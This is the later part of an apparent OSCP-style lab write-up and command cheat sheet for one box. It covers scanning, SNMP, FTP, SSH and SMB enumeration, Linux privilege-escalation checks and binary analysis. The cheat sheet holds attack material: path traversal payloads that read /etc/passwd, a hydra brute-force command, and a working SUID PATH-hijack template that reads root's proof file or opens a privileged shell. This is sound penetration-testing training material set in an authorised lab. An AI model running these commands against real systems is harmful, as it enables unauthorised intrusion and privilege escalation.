+ssh-keygen<span class="w"> </span>-l<span class="w"> </span>-f<span class="w"> </span>key<span class="w">                             </span>#<span class="w"> </span><span class="nb">read</span><span class="w"> </span>the<span class="w"> </span>comment<span class="w"> </span>first:<span class="w"> </span>it<span class="w"> </span>names<span class="w"> </span>the<span class="w"> </span>user
+</pre></div>
+<h4>SMB</h4>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>--shares
+nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span>guest<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>--shares
+nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-p<span class="w"> </span>pass<span class="w"> </span>-d<span class="w"> </span>DOMAIN<span class="w"> </span>--shares
+</pre></div>
+<hr />
+<h3>Phase 4 — Foothold</h3>
+<p>Get a shell, then <strong>immediately</strong> stabilise and record identity:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>id<span class="p">;</span><span class="w"> </span>hostname<span class="p">;</span><span class="w"> </span>sudo<span class="w"> </span>-n<span class="w"> </span>-l<span class="p">;</span><span class="w"> </span>uname<span class="w"> </span>-a
+</pre></div>
+<p>Do not start hunting for privesc before you know exactly which uid and groups you hold — the
+escalation path depends on it.</p>
+<hr />
+<h3>Phase 5 — Local enumeration (Linux)</h3>
+<p>Send one script over one connection and read one report:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ssh<span class="w"> </span>user@<span class="nv">$TARGET</span><span class="w"> </span><span class="s1">&#39;bash -s&#39;</span><span class="w"> </span>&lt;<span class="w"> </span>enum.sh
+</pre></div>
+<p>Checklist, in the order that finds things:</p>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Check</th>
+<th>Command</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>sudo rights</td>
+<td><code>sudo -n -l</code></td>
+</tr>
+<tr>
+<td>2</td>
+<td>SUID, excluding snap noise</td>
+<td><code>find / -perm -4000 -type f 2&gt;/dev/null \| grep -v '^/snap'</code></td>
+</tr>
+<tr>
+<td>3</td>
+<td>Capabilities</td>
+<td><code>getcap -r / 2&gt;/dev/null</code></td>
+</tr>
+<tr>
+<td>4</td>
+<td>Cron</td>
+<td><code>cat /etc/crontab; ls -la /etc/cron.*</code></td>
+</tr>
+<tr>
+<td>5</td>
+<td>Writable service files</td>
+<td><code>find / -writable -type f -path '*/etc/*' 2&gt;/dev/null</code></td>
+</tr>
+<tr>
+<td>6</td>
+<td>Listening sockets</td>
+<td><code>ss -tlnp</code></td>
+</tr>
+<tr>
+<td>7</td>
+<td>Home directories</td>
+<td><code>ls -la /home/*</code> — this box had the SUID helper in a user's home</td>
+</tr>
+<tr>
+<td>8</td>
+<td>History and keys</td>
+<td><code>ls -la ~/.ssh; cat ~/.bash_history</code></td>
+</tr>
+<tr>
+<td>9</td>
+<td>Kernel</td>
+<td><code>uname -a</code> — only if 1–8 are empty</td>
+</tr>
+<tr>
+<td>10</td>
+<td>Password reuse</td>
+<td>the foothold password against <code>sudo -S</code> and other users</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Rule:</strong> a <em>custom</em> SUID binary beats every generic exploit. Read it before reaching for
+<code>linpeas</code> output tables.</p>
+<hr />
+<h3>Phase 6 — Binary analysis (when a SUID binary looks custom)</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>file<span class="w"> </span>/path/binary<span class="w">                    </span><span class="c1"># not stripped? then function names survive</span>
+strings<span class="w"> </span>-a<span class="w"> </span>/path/binary<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-40<span class="w">   </span><span class="c1"># look for system, popen, exec*, and bare command names</span>
+objdump<span class="w"> </span>-d<span class="w"> </span>-M<span class="w"> </span>intel<span class="w"> </span>/path/binary<span class="w"> </span><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span>-n<span class="w"> </span><span class="s1">&#39;/&lt;main&gt;:/,/^$/p&#39;</span>
+readelf<span class="w"> </span>-d<span class="w"> </span>/path/binary<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;BIND_NOW|FLAGS&#39;</span><span class="w">   </span>#<span class="w"> </span>is<span class="w"> </span>RELRO<span class="w"> </span>full?<span class="w"> </span><span class="o">(</span>memory<span class="w"> </span>bugs<span class="w"> </span>are<span class="w"> </span><span class="k">then</span><span class="w"> </span>out<span class="o">)</span>
+</pre></div>
+<p>What you are looking for, in priority order:</p>
+<ol>
+<li><code>system()</code> / <code>popen()</code> with a <strong>bare command name</strong> → <code>PATH</code> hijack (CWE-426)</li>
+<li><code>setuid(0)</code>/<code>seteuid(0)</code> <strong>before</strong> that call → the shell will not drop privileges → full root</li>
+<li>A writable path used by root → symlink or overwrite attack</li>
+<li>A shell escape in a pager/editor it invokes</li>
+</ol>
+<p>If the binary is setuid <strong>and</strong> setgid, or lives in a user-writable directory, the box author is
+telling you this is the path.</p>
+<hr />
+<h3>Phase 7 — Post-exploitation and reporting</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>cat<span class="w"> </span>/root/proof.txt<span class="p">;</span><span class="w"> </span>cat<span class="w"> </span>/home/*/local.txt
+ip<span class="w"> </span>a<span class="p">;</span><span class="w"> </span>ip<span class="w"> </span>r<span class="w">          </span>#<span class="w"> </span>can<span class="w"> </span>this<span class="w"> </span>host<span class="w"> </span>pivot?<span class="w"> </span><span class="o">(</span>single<span class="w"> </span>NIC<span class="w"> </span>+<span class="w"> </span>default<span class="w"> </span><span class="nv">route</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>no<span class="o">)</span>
+</pre></div>
+<p>Record: exact flags, the <code>id</code> output as root, the mechanism in one paragraph, and every command
+with its output. Then clean up.</p>
+<h4>Cleanup checklist</h4>
+<ul>
+<li>Remove every file you created, then <strong>verify</strong> with <code>ls</code>.</li>
+<li>Revert any file you modified.</li>
+<li>Do not change credentials you do not own; if an exploit would have (this box's <code>chpasswd</code>),
+  note that it did not run.</li>
+<li>Note in the report what you changed and what you left alone.</li>
+</ul>
+<hr />
+<h3>Timeboxing heuristics</h3>
+<table>
+<thead>
+<tr>
+<th>Situation</th>
+<th>Budget</th>
+<th>Move on when</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Web on a stock default page</td>
+<td>10 min</td>
+<td>Two wordlists + vhosts agree there is nothing</td>
+</tr>
+<tr>
+<td>Version-CVE rabbit hole</td>
+<td>5 min</td>
+<td>The package revision shows the backport</td>
+</tr>
+<tr>
+<td>Credential guessing</td>
+<td>5 min per service</td>
+<td>Account-specific defaults exhausted</td>
+</tr>
+<tr>
+<td>Generic privesc sweep</td>
+<td>15 min</td>
+<td>A custom SUID/service/cron finding exists</td>
+</tr>
+</tbody>
+</table>
+<p>The recurring lesson: <strong>spend the time on the surface you have not looked at, not on the one you
+have already disproved.</strong> On this box, thirty UDP ports were worth more than an hour of web.</p></div></section>
+<section class="chapter" id="ch-09" data-title="Cheat sheet"><div class="ch-head"><span class="ch-num">09</span><div class="ch-title"><h2>Cheat sheet</h2><p class="ch-sub">Every command, with the flag that matters</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p>Only commands I have actually needed, with the small flag that matters each time.</p>
+<hr />
+<h3>Scanning</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="c1">## full TCP, fast — always -p-</span>
+nmap<span class="w"> </span>-p-<span class="w"> </span>--min-rate<span class="w"> </span><span class="m">3000</span><span class="w"> </span>-T4<span class="w"> </span>-oN<span class="w"> </span>full_tcp.txt<span class="w"> </span><span class="nv">$T</span>
+
+<span class="c1">## versions + default scripts on the ports that matter</span>
+nmap<span class="w"> </span>-sV<span class="w"> </span>-sC<span class="w"> </span>-p21,22,80<span class="w"> </span>-oN<span class="w"> </span>services.txt<span class="w"> </span><span class="nv">$T</span>
+
+<span class="c1">## UDP: the phase everyone skips</span>
+nmap<span class="w"> </span>-sU<span class="w"> </span>--top-ports<span class="w"> </span><span class="m">30</span><span class="w"> </span>-T4<span class="w"> </span>--max-retries<span class="w"> </span><span class="m">1</span><span class="w"> </span>--host-timeout<span class="w"> </span>180s<span class="w"> </span><span class="nv">$T</span>
+
+<span class="c1">## live hosts</span>
+nmap<span class="w"> </span>-sn<span class="w"> </span><span class="m">192</span>.168.245.0/24<span class="w"> </span>-oG<span class="w"> </span>-<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span>up<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">&#39;{print $2}&#39;</span>
+</pre></div>
+<hr />
+<h3>SNMP</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="c1">## find the community string</span>
+<span class="k">for</span><span class="w"> </span>c<span class="w"> </span><span class="k">in</span><span class="w"> </span>public<span class="w"> </span>private<span class="w"> </span>manager<span class="w"> </span>internal<span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">  </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;== </span><span class="nv">$c</span><span class="s2">&quot;</span><span class="p">;</span><span class="w"> </span>snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$c</span><span class="s2">&quot;</span><span class="w"> </span>-t<span class="w"> </span><span class="m">5</span><span class="w"> </span>-r<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.1<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-3
+<span class="k">done</span>
+
+<span class="c1">## full walk to a file, then grep it</span>
+snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span>-t<span class="w"> </span><span class="m">5</span><span class="w"> </span>-r<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="nv">$T</span><span class="w"> </span>&gt;<span class="w"> </span>snmp_full.txt
+
+<span class="c1">## the three trees that matter on Linux</span>
+snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="m">1</span>.3.6.1.4.1.8072.1.3.2<span class="w">    </span><span class="c1"># nsExtendTable (commands + descriptions)</span>
+snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.25.4.2.1.2<span class="w">    </span><span class="c1"># process names</span>
+snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.25.6.3.1.2<span class="w">    </span><span class="c1"># installed packages</span>
+snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.4.20.1.1<span class="w">      </span><span class="c1"># interface IPs</span>
+
+<span class="c1">## decode an nsExtendTable index suffix (5.82.69.83.69.84 -&gt; RESET)</span>
+python3<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;s=&#39;82.69.83.69.84&#39;.split(&#39;.&#39;); print(&#39;&#39;.join(chr(int(x)) for x in s[1:]))&quot;</span>
+
+<span class="c1">## bulk walk when v1 is slow</span>
+snmpbulkwalk<span class="w"> </span>-v2c<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="m">1</span>.3.6.1.4.1.8072.1.3.2
+</pre></div>
+<hr />
+<h3>Web</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-s<span class="w"> </span>-i<span class="w"> </span>http://<span class="nv">$T</span>/<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-20
+curl<span class="w"> </span>-s<span class="w"> </span>-o<span class="w"> </span>/dev/null<span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;%{http_code} %{size_download}\n&quot;</span><span class="w"> </span>http://<span class="nv">$T</span>/robots.txt
+
+<span class="c1">## path traversal tests — --path-as-is is mandatory or curl normalises the payload</span>
+curl<span class="w"> </span>-s<span class="w"> </span>--path-as-is<span class="w"> </span><span class="s2">&quot;http://</span><span class="nv">$T</span><span class="s2">/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd&quot;</span>
+curl<span class="w"> </span>-s<span class="w"> </span>--path-as-is<span class="w"> </span><span class="s2">&quot;http://</span><span class="nv">$T</span><span class="s2">/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/etc/passwd&quot;</span>
+
+feroxbuster<span class="w"> </span>-u<span class="w"> </span>http://<span class="nv">$T</span><span class="w"> </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-t<span class="w"> </span><span class="m">40</span><span class="w"> </span>-d<span class="w"> </span><span class="m">2</span><span class="w"> </span>--smart<span class="w"> </span>--no-state<span class="w"> </span>-q
+
+ffuf<span class="w"> </span>-u<span class="w"> </span>http://<span class="nv">$T</span>/<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Host: FUZZ&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-mc<span class="w"> </span>all<span class="w"> </span>-fr<span class="w"> </span><span class="s2">&quot;Apache2 Ubuntu Default Page&quot;</span><span class="w"> </span>-t<span class="w"> </span><span class="m">40</span><span class="w"> </span>-s
+</pre></div>
+<hr />
+<h3>FTP</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ftp<span class="w"> </span>-n<span class="w"> </span>-v<span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="o">&lt;&lt;&lt;</span><span class="w"> </span><span class="s1">$&#39;user anonymous anon@test\nls\nbye&#39;</span><span class="w">    </span><span class="c1"># 530 right after USER =&gt; anonymous off</span>
+
+hydra<span class="w"> </span>-L<span class="w"> </span>users.txt<span class="w"> </span>-P<span class="w"> </span>pass.txt<span class="w"> </span>-t<span class="w"> </span><span class="m">4</span><span class="w"> </span>-f<span class="w"> </span>-V<span class="w"> </span>ftp://<span class="nv">$T</span><span class="w">       </span><span class="c1"># -t 4 keeps vsftpd happy</span>
+
+curl<span class="w"> </span>-s<span class="w"> </span>-u<span class="w"> </span>user:pass<span class="w"> </span><span class="s2">&quot;ftp://</span><span class="nv">$T</span><span class="s2">/&quot;</span><span class="w">                         </span><span class="c1"># list</span>
+curl<span class="w"> </span>-s<span class="w"> </span>-u<span class="w"> </span>user:pass<span class="w"> </span>-o<span class="w"> </span>file<span class="w"> </span><span class="s2">&quot;ftp://</span><span class="nv">$T</span><span class="s2">/file&quot;</span><span class="w">             </span>#<span class="w"> </span>download
+</pre></div>
+<hr />
+<h3>SSH</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ssh-keygen<span class="w"> </span>-l<span class="w"> </span>-f<span class="w"> </span>id_rsa<span class="w">                                  </span><span class="c1"># comment names the user</span>
+
+<span class="c1">## BatchMode=yes so it never hangs on a password prompt</span>
+ssh<span class="w"> </span>-i<span class="w"> </span>id_rsa<span class="w"> </span>-o<span class="w"> </span><span class="nv">BatchMode</span><span class="o">=</span>yes<span class="w"> </span>-o<span class="w"> </span><span class="nv">StrictHostKeyChecking</span><span class="o">=</span>no<span class="w"> </span>user@<span class="nv">$T</span><span class="w"> </span>id
+
+sshpass<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;pass&#39;</span><span class="w"> </span>ssh<span class="w"> </span>-o<span class="w"> </span><span class="nv">PreferredAuthentications</span><span class="o">=</span>password<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-o<span class="w"> </span><span class="nv">PubkeyAuthentication</span><span class="o">=</span>no<span class="w"> </span>user@<span class="nv">$T</span><span class="w"> </span>id
+
+<span class="c1">## run a whole enumeration script in one connection</span>
+ssh<span class="w"> </span>-i<span class="w"> </span>id_rsa<span class="w"> </span>user@<span class="nv">$T</span><span class="w"> </span><span class="s1">&#39;bash -s&#39;</span><span class="w"> </span>&lt;<span class="w"> </span>enum.sh
+</pre></div>
+<hr />
+<h3>SMB</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$T</span><span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>--shares
+nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$T</span><span class="w"> </span>-u<span class="w"> </span>guest<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>--shares
+nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$T</span><span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;pass&#39;</span><span class="w"> </span>-d<span class="w"> </span>DOMAIN<span class="w"> </span>--shares
+
+smbclient<span class="w"> </span>//<span class="nv">$T</span>/share<span class="w"> </span>-U<span class="w"> </span><span class="s1">&#39;DOMAIN/user%pass&#39;</span><span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;recurse; ls&#39;</span>
+smbclient<span class="w"> </span>//<span class="nv">$T</span>/share<span class="w"> </span>-U<span class="w"> </span><span class="s1">&#39;DOMAIN/user%pass&#39;</span><span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;get file.txt&#39;</span>
+</pre></div>
+<hr />
+<h3>Linux local enumeration</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>id<span class="p">;</span><span class="w"> </span>hostname<span class="p">;</span><span class="w"> </span>sudo<span class="w"> </span>-n<span class="w"> </span>-l<span class="p">;</span><span class="w"> </span>uname<span class="w"> </span>-a
+
+<span class="c1">## SUID without tripling the output on snap</span>
+find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-4000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s1">&#39;^/snap&#39;</span>
+
+find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-2000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s1">&#39;^/snap&#39;</span><span class="w">    </span><span class="c1"># setgid</span>
+getcap<span class="w"> </span>-r<span class="w"> </span>/<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+cat<span class="w"> </span>/etc/crontab<span class="p">;</span><span class="w"> </span>ls<span class="w"> </span>-la<span class="w"> </span>/etc/cron.*
+ss<span class="w"> </span>-tlnp
+ls<span class="w"> </span>-la<span class="w"> </span>/home/*<span class="w"> </span>/opt<span class="w"> </span>/srv<span class="w"> </span>/var/www
+find<span class="w"> </span>/<span class="w"> </span>-name<span class="w"> </span>local.txt<span class="w"> </span>-o<span class="w"> </span>-name<span class="w"> </span>proof.txt<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</pre></div>
+<hr />
+<h3>Binary analysis</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>file<span class="w"> </span>bin<span class="w">                                  </span><span class="c1"># &quot;not stripped&quot; = function names survive</span>
+strings<span class="w"> </span>-a<span class="w"> </span>bin<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-40<span class="w">                 </span><span class="c1"># system / popen / exec / bare command names</span>
+objdump<span class="w"> </span>-d<span class="w"> </span>-M<span class="w"> </span>intel<span class="w"> </span>bin<span class="w"> </span><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span>-n<span class="w"> </span><span class="s1">&#39;/&lt;main&gt;:/,/^$/p&#39;</span>
+readelf<span class="w"> </span>-d<span class="w"> </span>bin<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;BIND_NOW|FLAGS&#39;</span><span class="w"> </span><span class="c1"># full RELRO =&gt; forget GOT overwrite</span>
+objdump<span class="w"> </span>-s<span class="w"> </span>-j<span class="w"> </span>.rodata<span class="w"> </span>bin<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w">          </span>#<span class="w"> </span>resolve<span class="w"> </span>the<span class="w"> </span>strings<span class="w"> </span>passed<span class="w"> </span>to<span class="w"> </span>system<span class="o">()</span>
+</pre></div>
+<p>Reconstructing source from a small binary:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">+ setuid / setgid  →  setuid(0); setgid(0);
++ lea rdi,[rip+...] →  the argument is a fixed string
++ call system@plt  →  system("...")</span></pre></div>
+<hr />
+<h3>Privesc — PATH hijack template</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nv">D</span><span class="o">=</span><span class="k">$(</span>mktemp<span class="w"> </span>-d<span class="w"> </span>/tmp/x.XXXXXX<span class="k">)</span>
+cat<span class="w"> </span>&gt;<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">/chpasswd&quot;</span><span class="w"> </span><span class="s">&lt;&lt;&#39;EOF&#39;</span>
+<span class="s">#!/bin/bash</span>
+<span class="s">id &gt; /tmp/root_id.txt</span>
+<span class="s">cat /root/proof.txt &gt; /tmp/root_proof.txt 2&gt;&amp;1</span>
+<span class="s">chmod 644 /tmp/root_id.txt /tmp/root_proof.txt</span>
+<span class="s">EOF</span>
+chmod<span class="w"> </span>+x<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">/chpasswd&quot;</span>
+
+<span class="c1">## name the faked binary exactly as the SUID program invokes it</span>
+<span class="nv">PATH</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">:</span><span class="nv">$PATH</span><span class="s2">&quot;</span><span class="w"> </span>/path/to/suid_binary
+
+cat<span class="w"> </span>/tmp/root_id.txt
+</pre></div>
+<p>Works only when the SUID binary calls <code>setuid(0)</code>/<code>seteuid(0)</code> <strong>before</strong> <code>system()</code>. If it does
+not, the shell drops privileges and the payload runs as you. Check the disassembly order first.</p>
+<p>Interactive variant:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">printf</span><span class="w"> </span><span class="s1">&#39;#!/bin/bash\n/bin/bash -p\n&#39;</span><span class="w"> </span>&gt;<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">/chpasswd&quot;</span><span class="p">;</span><span class="w"> </span>chmod<span class="w"> </span>+x<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">/chpasswd&quot;</span>
+<span class="nv">PATH</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">:</span><span class="nv">$PATH</span><span class="s2">&quot;</span><span class="w"> </span>/path/to/suid_binary
+</pre></div>
+<hr />
+<h3>Cleanup</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nv">D</span><span class="o">=</span><span class="k">$(</span>mktemp<span class="w"> </span>-d<span class="w"> </span>/tmp/c.XXXXXX<span class="k">)</span>
+<span class="nb">printf</span><span class="w"> </span><span class="s1">&#39;#!/bin/bash\nrm -f /tmp/root_id.txt /tmp/root_proof.txt; rm -rf /tmp/x.*\n&#39;</span><span class="w"> </span>&gt;<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">/chpasswd&quot;</span>
+chmod<span class="w"> </span>+x<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">/chpasswd&quot;</span>
+<span class="nv">PATH</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">:</span><span class="nv">$PATH</span><span class="s2">&quot;</span><span class="w"> </span>/path/to/suid_binary
+ls<span class="w"> </span>-la<span class="w"> </span>/tmp/root_id.txt<span class="w">        </span>#<span class="w"> </span>must<span class="w"> </span>be<span class="w"> </span><span class="s2">&quot;No such file or directory&quot;</span>
+</pre></div></div></section>
+
+    <footer>
+      <span>Authorised lab environment · flags and credentials are lab-specific</span>
+      <span><a href="https://github.com/AV10V/OSCP">source on GitHub</a> · built 21 November 2026</span>
+    </footer>
+  </main>
+</div>
+
+<button id="toTop" type="button" aria-label="Back to top">↑</button>
+<div id="toast" role="status" aria-live="polite"></div>
+<script>
+(function(){
+  "use strict";
+  var root=document.documentElement;
+
+  /* ---------- theme ---------- */
+  var THEME_KEY="oscp-theme";
+  function setTheme(t){root.setAttribute("data-theme",t);try{localStorage.setItem(THEME_KEY,t)}catch(e){}}
+  var saved=null;try{saved=localStorage.getItem(THEME_KEY)}catch(e){}
+  if(!saved){saved=window.matchMedia&&window.matchMedia("(prefers-color-scheme: light)").matches?"light":"dark";}
+  setTheme(saved);
+  document.getElementById("themeBtn").addEventListener("click",function(){
+    setTheme(root.getAttribute("data-theme")==="dark"?"light":"dark");
+  });
+
+  /* ---------- wrap h3 sections into collapsible cards ---------- */
+  document.querySelectorAll(".content").forEach(function(content){
+    var kids=Array.prototype.slice.call(content.children);
+    var current=null, sec=null, body=null;
+    kids.forEach(function(el){
+      if(el.tagName==="H3"){
+        sec=document.createElement("section");sec.className="sec";
+        var btn=document.createElement("button");
+        btn.type="button";btn.className="sec-head";btn.setAttribute("aria-expanded","true");
+        btn.textContent=el.textContent;
+        body=document.createElement("div");body.className="sec-body";
+        content.insertBefore(sec,el);
+        sec.appendChild(btn);sec.appendChild(body);
+        el.remove();
+        btn.addEventListener("click",function(){
+          var panel=btn.nextElementSibling;
+          var open=btn.getAttribute("aria-expanded")==="true";
+          btn.setAttribute("aria-expanded",open?"false":"true");
+          if(panel)panel.hidden=open;
+        });
+        current=body;
+      }else if(current){
+        current.appendChild(el);
+      }
+    });
+  });
+
+  /* ---------- copy buttons ---------- */
+  var toast=document.getElementById("toast"),toastTimer=null;
+  function say(msg){
+    toast.textContent=msg;toast.classList.add("show");
+    clearTimeout(toastTimer);toastTimer=setTimeout(function(){toast.classList.remove("show")},1600);
+  }
+  function copy(text,btn){
+    function ok(){if(btn){btn.classList.add("done");var t=btn.textContent;btn.textContent="Copied";
+      setTimeout(function(){btn.classList.remove("done");btn.textContent=t},1400);}say("Copied to clipboard");}
+    if(navigator.clipboard&&navigator.clipboard.writeText){
+      navigator.clipboard.writeText(text).then(ok).catch(function(){fallback(text);ok();});
+    }else{fallback(text);ok();}
+  }
+  function fallback(text){
+    var ta=document.createElement("textarea");ta.value=text;ta.style.position="fixed";ta.style.opacity="0";
+    document.body.appendChild(ta);ta.select();try{document.execCommand("copy")}catch(e){}document.body.removeChild(ta);
+  }
+  document.addEventListener("click",function(e){
+    var btn=e.target.closest(".copy");
+    if(!btn)return;
+    var block=btn.closest(".block"),pre=block&&block.querySelector("pre");
+    if(pre)copy(pre.innerText.replace(/\s+$/,""),btn);
+  });
+
+  /* copy every command in a chapter */
+  document.querySelectorAll(".copyall").forEach(function(btn){
+    btn.addEventListener("click",function(){
+      var ch=btn.closest(".chapter");
+      var cmds=Array.prototype.map.call(ch.querySelectorAll(".block-cmd pre"),function(p){return p.innerText.replace(/\s+$/,"")});
+      if(!cmds.length){say("No commands in this chapter");return;}
+      copy(cmds.join("\n\n"),btn);
+    });
+  });
+
+  /* ---------- progress ---------- */
+  var PKEY="oscp-progress-snmp-mouse";
+  var checks=Array.prototype.slice.call(document.querySelectorAll(".nav-check"));
